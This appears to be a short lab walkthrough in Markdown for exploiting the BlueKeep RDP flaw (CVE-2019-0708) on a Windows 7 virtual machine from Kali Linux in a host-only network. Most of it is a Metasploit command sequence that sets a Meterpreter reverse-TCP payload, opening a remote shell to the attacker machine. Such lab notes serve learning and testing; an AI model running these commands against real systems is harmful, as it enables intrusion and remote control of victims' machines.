### Setting up environment
* Open Windows 7 and Kali-Linux with `localhost only` mode

    :::
* Then we can note that the IP of these two machines are different:

    :::
    Now, we know `Win7`'s IP: `192.168.56.101`
    Kali-Linux's IP: `192.168.56.102`

* Test the connection of these machines

### Try to Exploit
* Open Metasploit in Kali-Linux
    ```bash!
    $ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    $ info # Can check the mode you'd like to use
    $ set rhost 192.168.56.101 # set remote host IP -> victim(Win7)
    $ set lhost 192.168.56.102 # set local host IP -> attacker(Kali-Linux)
    $ set target 2 # For virtual-box mode
    $ set payload windows/x64/meterpreter/reverse_tcp # Set the exploited payload
    $ check # Check if the victim can be exploited or not
    $ exploit # Actually attack
    ```
    :::info
    Sometimes the attack will not always success, you must try until it success.
